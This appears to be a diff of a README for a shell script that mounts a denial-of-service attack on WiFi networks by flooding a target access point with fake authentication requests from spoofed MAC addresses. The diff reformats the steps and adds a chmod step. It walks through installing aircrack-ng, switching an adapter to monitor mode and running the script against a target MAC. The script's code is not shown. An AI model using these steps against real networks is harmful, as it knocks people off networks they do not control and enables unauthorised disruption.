@@ -10,24 +10,30 @@ A Denial Of Service attack targeting wifi networks through flooding the wifi net
 first install aircrack-ng since you will need aireplay-ng to use the script:
 
 
--sudo apt install aircrack-ng
+    -sudo apt install aircrack-ng
 
 
 now set your wireless adapter to monitor mode:
 
 
--airmon-ng start (your wireless adapter name)
+    -airmon-ng start (your wireless adapter name)
+    
+   
+Before running the script, chmod it to make it executable
 
+
+    -chmod u+x ./fake_auth.sh
+    
 
 now you can run the script by giving it the following parameters
 
--Number of fake authentication requests through different mac addresses
+1)Number of fake authentication requests through different mac addresses
 
--target network mac address
+2)target network mac address
 
--monitor mode adapter name
+3)monitor mode adapter name
 
 the command should look something like:
 
 
--sudo ./fake_auth.sh 99 00:00:00:00:00:00 wlan0mon
+    -sudo ./fake_auth.sh 99 00:00:00:00:00:00 wlan0mon
